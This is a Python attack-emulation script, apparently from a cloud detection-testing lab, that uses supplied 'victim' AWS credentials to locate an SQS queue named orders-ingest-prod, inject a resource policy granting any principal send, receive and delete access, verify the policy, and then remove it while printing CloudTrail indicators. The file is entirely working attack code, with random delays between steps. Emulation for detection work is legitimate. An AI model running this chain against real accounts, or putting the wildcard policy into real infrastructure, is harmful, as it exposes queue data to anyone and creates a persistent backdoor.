# FILE: attack.py
"""
ATOMIC-sqs-open-queue-policy -- Automated Post-Exploitation Attack Script
Executes a 5-step, 1-phase attack chain: SQS open resource policy injection (T1098).

Entry point (backend contract):
    run(outputs: dict, region: str = 'us-east-1') -> None
"""
import sys
import time
import random
import json

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _print(msg):
    print(msg, flush=True)

def print_step(msg):
    _print(f"\n[*] {msg}")

def print_ok(msg):
    _print(f"[+] {msg}")

def print_err(msg):
    _print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


# ---------------------------------------------------------------------------
# Static resource names (known from infra plan -- no dynamic resolution needed)
# ---------------------------------------------------------------------------
_QUEUE_NAME = "orders-ingest-prod"
_DLQ_NAME   = "orders-ingest-dlq"
_DECOY_NAME = "payments-processing-prod"


# ---------------------------------------------------------------------------
# Main entry point (backend contract)
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Execute the SQS open resource policy injection chain.
    All credentials and dynamic values are read exclusively from `outputs`.
    """
    # ---- Resolve victim credentials from Pulumi outputs -------------------
    victim_key_id = outputs.get("victim_access_key_id")
    victim_key_secret = outputs.get("victim_secret_access_key")
    victim_session_token = outputs.get("victim_session_token")  # optional

    if not victim_key_id:
        raise RuntimeError("Missing required output: victim_access_key_id")
    if not victim_key_secret:
        raise RuntimeError("Missing required output: victim_secret_access_key")

    # ---- Build the victim boto3 session (phase_1_victim_creds) ------------
    session_kwargs = dict(
        aws_access_key_id=victim_key_id,
        aws_secret_access_key=victim_key_secret,
        region_name=region,
    )
    if victim_session_token:
        session_kwargs["aws_session_token"] = victim_session_token

    victim_session = boto3.Session(**session_kwargs)
    sqs = victim_session.client("sqs", region_name=region)

    _print("=" * 66)
    _print("ATOMIC: SQS Open Resource Policy Injection (T1098)")
    _print("Tactics: Persistence")
    _print(f"Region : {region}")
    _print(f"Target : {_QUEUE_NAME}")
    _print("=" * 66)

    # ======================================================================
    # PHASE 1 -- SQS Open Resource Policy Injection
    # ======================================================================

    # ------------------------------------------------------------------
    # Step 1 -- ListQueues: enumerate queues to confirm targets are reachable
    # ------------------------------------------------------------------
    print_step("Step 1/5 [T1098] - ListQueues: enumerating SQS queues")
    queue_url = None
    try:
        resp = sqs.list_queues()
        urls = resp.get("QueueUrls", [])
        _print(f"    Discovered {len(urls)} queue(s):")
        for url in urls:
            _print(f"      {url}")
            if url.rstrip("/").endswith(_QUEUE_NAME):
                queue_url = url
        if queue_url:
            print_ok(f"Target queue located: {queue_url}")
        else:
            raise RuntimeError(
                f"Target queue '{_QUEUE_NAME}' not found in ListQueues response. "
                "Ensure infra is deployed."
            )
    except ClientError as e:
        code = e.response["Error"]["Code"]
        print_err(f"ListQueues failed [{code}]: {e}")
        raise

    op_delay(2, 5)

    # ------------------------------------------------------------------
    # Step 2 -- GetQueueAttributes (QueueArn): resolve ARN for policy Resource
    # Using the real ARN avoids MalformedPolicyDocument -- never construct
    # the ARN from a placeholder account ID.
    # ------------------------------------------------------------------
    print_step("Step 2/5 [T1098] - GetQueueAttributes: resolving queue ARN")
    queue_arn = None
    try:
        resp = sqs.get_queue_attributes(
            QueueUrl=queue_url,
            AttributeNames=["QueueArn"],
        )
        queue_arn = resp["Attributes"].get("QueueArn")
        if not queue_arn:
            raise RuntimeError("QueueArn not present in GetQueueAttributes response.")
        print_ok(f"Queue ARN resolved: {queue_arn}")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        print_err(f"GetQueueAttributes (ARN) failed [{code}]: {e}")
        raise

    op_delay(1, 4)

    # ------------------------------------------------------------------
    # Step 3 -- SetQueueAttributes: inject wildcard open resource policy
    # Tradecraft: real SQS misconfiguration incidents (e.g. exposed payment
    # queues) typically arise from over-broad sqs:* grants to Principal '*'.
    # This emulates an insider or compromised role injecting a backdoor
    # resource policy to enable unauthenticated SendMessage/ReceiveMessage
    # from any AWS principal, including anonymous callers.
    # ------------------------------------------------------------------
    print_step("Step 3/5 [T1098] - SetQueueAttributes: injecting open resource policy (Principal: '*')")

    open_policy = json.dumps({
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "EmulationOpenPolicy",
                "Effect": "Allow",
                "Principal": "*",
                "Action": [
                    "sqs:SendMessage",
                    "sqs:ReceiveMessage",
                    "sqs:DeleteMessage",
                    "sqs:GetQueueAttributes",
                ],
                "Resource": queue_arn,
            }
        ],
    })

    try:
        sqs.set_queue_attributes(
            QueueUrl=queue_url,
            Attributes={"Policy": open_policy},
        )
        print_ok("Open resource policy injected successfully.")
        _print(f"    Policy Resource : {queue_arn}")
        _print( "    Principal       : * (wildcard -- public access)")
        _print( "    Actions granted : SendMessage, ReceiveMessage, DeleteMessage, GetQueueAttributes")
        _print( "    CloudTrail IOC  : SetQueueAttributes with Principal '*' on orders-ingest-prod")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        print_err(f"SetQueueAttributes (inject) failed [{code}]: {e}")
        raise

    op_delay(2, 6)

    # ------------------------------------------------------------------
    # Step 4 -- GetQueueAttributes (Policy): verify injected policy is live
    # ------------------------------------------------------------------
    print_step("Step 4/5 [T1098] - GetQueueAttributes: verifying active wildcard policy")
    try:
        resp = sqs.get_queue_attributes(
            QueueUrl=queue_url,
            AttributeNames=["Policy"],
        )
        live_policy_str = resp["Attributes"].get("Policy", "")
        if '"Principal":"*"' in live_policy_str or '"Principal": "*"' in live_policy_str:
            print_ok("Verification passed -- wildcard principal confirmed in live policy.")
        else:
            print_err("Verification WARN: Policy attribute does not contain wildcard principal.")
            _print(f"    Live policy: {live_policy_str[:500]}")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        print_err(f"GetQueueAttributes (verify) failed [{code}]: {e}")
        # Non-fatal -- cleanup must still run

    op_delay(1, 3)

    # ------------------------------------------------------------------
    # Step 5 -- SetQueueAttributes: remove injected policy (cleanup)
    # Restores orders-ingest-prod to its original no-resource-policy state.
    # An empty Policy string is the SQS API mechanism for policy deletion.
    # ------------------------------------------------------------------
    print_step("Step 5/5 [T1098] - SetQueueAttributes: removing injected policy (cleanup)")
    try:
        sqs.set_queue_attributes(
            QueueUrl=queue_url,
            Attributes={"Policy": ""},
        )
        print_ok("Resource policy removed -- queue restored to no-policy state.")
        _print("    CloudTrail IOC  : SetQueueAttributes clearing resource policy (cleanup event)")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        print_err(f"SetQueueAttributes (cleanup) failed [{code}]: {e}")
        _print("    Manual cleanup required: call SetQueueAttributes with empty Policy on orders-ingest-prod")

    op_delay(1, 3)

    # ======================================================================
    # Summary
    # ======================================================================
    _print("\n" + "=" * 66)
    _print("EMULATION COMPLETE -- CloudTrail Events Generated")
    _print("=" * 66)
    _print("  Step 1  ListQueues                sqs.amazonaws.com  [low]")
    _print("  Step 2  GetQueueAttributes (ARN)  sqs.amazonaws.com  [low]")
    _print("  Step 3  SetQueueAttributes (inject wildcard policy)  [medium]")
    _print("  Step 4  GetQueueAttributes (Policy verify)           [low]")
    _print("  Step 5  SetQueueAttributes (policy removal/cleanup)  [low]")
    _print("")
    _print("  Technique : T1098 Account Manipulation")
    _print("  Tactic    : Persistence")
    _print(f"  Target    : {_QUEUE_NAME} ({queue_arn})")
    _print("  Cleanup   : Policy removed inline (step 5) -- pulumi destroy handles infra")
    _print("=" * 66)
